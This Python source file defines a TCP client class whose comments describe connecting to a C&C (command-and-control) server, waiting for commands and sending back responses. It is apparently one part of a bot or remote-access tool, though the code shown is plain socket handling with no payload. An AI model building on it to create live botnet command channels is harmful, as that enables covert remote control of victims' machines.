'''
Created on Dec 20, 2013

@author: Onur
'''

import socket
from threading import Thread
from domain.CustomClient import CustomClient

class TCPClient(CustomClient):
    """ A TCP client.
        
        The client class is able to send and
        receive data without closing the connection.
        
        Attributes:
            __serverName: The C&C's IP or domain
            __serverPort: The C&C's port
            __csocket: Server connection socket.
            __serverResponse: The last response coming from the server
        
        """

    __serverName = None    
    __serverPort = None
    __csocket = None
    __serverResponse = []

    def __init__(self, serverName, serverPort):
        """ Initializes with server name and port."""        
        self.__serverName = serverName
        self.__serverPort = serverPort
    
    def connect(self):
        """ Connects to the C&C and send a hi, then receive a hi back."""
        self.__csocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__csocket.connect((self.__serverName, self.__serverPort))
        self.__csocket.send("Hi server\n")
        self.__csocket.recv(1024)
    
    def disconnect(self):
        """ Closes the server connection socket."""
        self.__csocket.close()
        
    def waitForCommand(self):
        """ Creates a thread to wait incoming commands.
            Returns the command as it arrives."""
        t = Thread(target = self.__run)
        t.start()
        t.join()
        return self.__serverResponse.pop()
    
    def __run(self):
        """ Puts incoming data to __serverResponse."""
        self.__serverResponse.append(self.__csocket.recv(1024))
        
        
    def sendResponse(self, data):
        """ Sends the data to the server."""
        self.__csocket.send(data)
